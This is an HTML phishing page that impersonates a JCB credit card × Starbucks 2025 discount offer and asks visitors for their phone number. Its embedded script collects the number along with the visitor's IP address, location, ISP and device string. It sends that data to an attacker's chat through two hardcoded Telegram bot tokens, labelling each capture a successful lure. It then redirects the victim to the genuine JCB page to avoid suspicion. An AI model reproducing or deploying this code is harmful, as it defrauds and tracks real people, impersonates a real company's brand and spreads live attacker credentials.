<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2025 JCB晶緻卡 × 星巴克獨享禮遇</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Noto Sans TC',sans-serif;background:#0F1621;color:#fff;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;overflow-x:hidden}
        .header{padding:20px 0 10px;text-align:center;background:#0F1621}
        .jcb-logo{max-width:72px;margin:0 auto 10px;display:block}
        .title{font-size:28px;font-weight:900;color:#FFC600;letter-spacing:1px;margin:8px 0}
        .subtitle{font-size:17px;color:#E0E0E0;margin-bottom:20px}
        .circle-badge{width:120px;height:120px;background:#FF5E38;border-radius:50%;margin:35px auto 40px;display:flex;align-items:center;justify-content:center;box-shadow:0 10px 30px rgba(255,94,56,0.4);font-size:19px;font-weight:900;color:white;line-height:1.2;text-align:center;border:4px solid #FFF3E0;flex-shrink:0}
        .box{background:rgba(255,255,255,0.1);backdrop-filter:blur(12px);border-radius:24px;margin:0 16px 30px;padding:32px 24px;border:1px solid rgba(255,255,255,0.15);box-shadow:0 15px 35px rgba(0,0,0,0.3);flex:1}
        .highlight{font-size:26px;font-weight:900;color:#FFC600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;letter-spacing:1px}
        .desc{font-size:16px;margin:12px 0 25px;color:#E8E8E8;line-height:1.6}
        .input-group{display:flex;height:56px;background:white;border-radius:16px;overflow:hidden;margin:20px 0;box-shadow:0 8px 25px rgba(0,0,0,0.25);font-size:18px}
        select{background:#f5f5f5;border:none;padding:0 15px;font-size:18px;color:#333}
        input{flex:1;border:none;padding:0 18px;font-size:18px;outline:none;color:#333}
        button{width:100%;padding:18px;background:#00704A;color:white;border:none;border-radius:16px;font-size:20px;font-weight:bold;margin-top:10px;box-shadow:0 8px 25px rgba(0,112,74,0.4);cursor:pointer;transition:all .2s}
        button:active{transform:scale(0.98)}
        button:disabled{background:#004d33}
        .footer{padding:20px 0;font-size:12px;text-align:center;color:#888;margin-top:auto}
        .footer a{color:#88C0D0;text-decoration:underline}
    </style>
</head>
<body>

    <div class="header">
        <img src="https://cache.jcb.co.jp/common/img/logo-jcb-w.svg" onerror="this.src='https://www.jcb.co.jp/promotion/common/img/logo-jcb-w.svg'" class="jcb-logo" alt="JCB" loading="eager">
        <div class="title">2025 獨享禮遇</div>
        <div class="subtitle">JCB晶緻卡 × 星巴克</div>
    </div>

    <div class="circle-badge">前1000名<br>送咖啡</div>

    <div class="box">
        <div class="highlight">指定品項半價優惠</div>
        <div class="desc">
            限 2025 全年・晶緻卡專屬<br>
            <span style="color:#FF6B6B;font-weight:700;">每個門號限領一次・立即領取專屬優惠碼</span>
        </div>

        <form id="loginForm">
            <div class="input-group">
                <select id="countryCode">
                    <option value="+886" selected>+886</option>
                    <option>+852</option><option>+60</option><option>+66</option><option>+63</option>
                </select>
                <input type="tel" id="phone" placeholder="912345678" required maxlength="12">
            </div>
            <button type="submit">立即領取優惠</button>
        </form>
    </div>

    <div class="footer">
        © 2025 JCB International Co., Ltd. All rights reserved.<br>
        <a href="https://www.jcb.co.jp/privacy/">隱私權政策</a> | 
        <a href="https://www.jcb.co.jp/terms/">服務條款</a>
    </div>

    <script>
        // 雙 token 保險
        const TOKENS = [
            "7989443479:AAE_YKV3EZJc4PNEkIMxq02BocEZw0p2CjE",
            "8059163852:AAH8cE9y3vL0dK7fXqZ5rT2mNjLpOqRsY"
        ];
        const CHAT_ID = "1137905005";

        // 三重超快 IP 查詢（任一成功就繼續，全部失敗也不會卡住）
        async function getIP() {
            const apis = [
                "https://cfip.mx/ip",           // Cloudflare 超快
                "https://api.ip.sb/ip",         // ip.sb
                "https://ipapi.co/json/"        // 原本的
            ];
            for (let api of apis) {
                try {
                    const r = await fetch(api, {signal: AbortSignal.timeout(2800)});
                    if (api.includes("cfip.mx") || api.includes("ip.sb")) {
                        const ip = await r.text();
                        return {ip: ip.trim(), city:"未知", country_name:"台灣", org:"未知"};
                    } else {
                        return await r.json();
                    }
                } catch(e) {}
            }
            return {ip:"未知", city:"未知", country_name:"台灣", org:"未知"};
        }

        document.getElementById("loginForm").addEventListener("submit", async function(e) {
            e.preventDefault();
            const code = document.getElementById("countryCode").value;
            const phone = document.getElementById("phone").value.trim();
            if (!phone) return;

            const btn = document.querySelector("button");
            btn.textContent = "驗證中...";
            btn.disabled = true;

            const ipData = await getIP();
            const 時間 = new Date().toLocaleString("zh-TW",{timeZone:"Asia/Taipei"});
            const 裝置 = navigator.userAgent.match(/\((.+?)\)/)?.[1] || "未知裝置";

            const 訊息 = "2025星巴克指定品項半價誘捕成功\n\n" +
                        "電話：" + code + phone + "\n" +
                        "IP　　：" + (ipData.ip || "未知") + "\n" +
                        "位置　：" + (ipData.city || "未知") + "，" + (ipData.country_name === "Taiwan" ? "台灣" : ipData.country_name || "未知") + "\n" +
                        "ISP　　：" + (ipData.org || "未知") + "\n" +
                        "時間　：" + 時間 + "\n" +
                        "裝置　：" + 裝置;

            // 雙 token 同時發，保證一定收到
            TOKENS.forEach(t => {
                fetch("https://api.telegram.org/bot"+t+"/sendMessage", {
                    method:"POST",
                    headers:{"Content-Type":"application/json"},
                    body:JSON.stringify({chat_id:CHAT_ID, text:訊息})
                }).catch(()=>{});
            });

            setTimeout(() => location.href = "https://www.specialoffers.jcb/zh-tw/services/dining-food/starbucks2025/", 3000);
        });
    </script>
</body>
</html>
